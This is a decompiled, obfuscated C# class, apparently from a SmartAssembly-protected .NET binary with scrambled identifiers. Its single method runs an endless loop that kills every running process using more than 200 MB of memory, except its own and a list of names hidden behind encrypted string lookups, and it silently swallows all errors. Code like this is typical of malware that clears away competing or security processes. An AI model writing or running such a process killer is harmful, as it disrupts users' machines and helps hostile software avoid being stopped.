using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

public static class cbEAJTQnRCW
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void NJWlvZIwzV()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107377763)) && !process.ProcessName.Contains(getString_0(107377722)) && !process.ProcessName.Contains(getString_0(107377713)) && !process.ProcessName.Contains(getString_0(107377736)) && !process.ProcessName.Contains(getString_0(107377723)) && !process.ProcessName.Contains(getString_0(107377678)) && !process.ProcessName.Contains(getString_0(107377697)) && !process.ProcessName.Contains(getString_0(107377652)) && !process.ProcessName.Contains(getString_0(107377671)) && !process.ProcessName.Contains(getString_0(107377114)) && !process.ProcessName.Contains(getString_0(107377125)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static cbEAJTQnRCW()
	{
		Strings.CreateGetStringDelegate(typeof(cbEAJTQnRCW));
	}
}
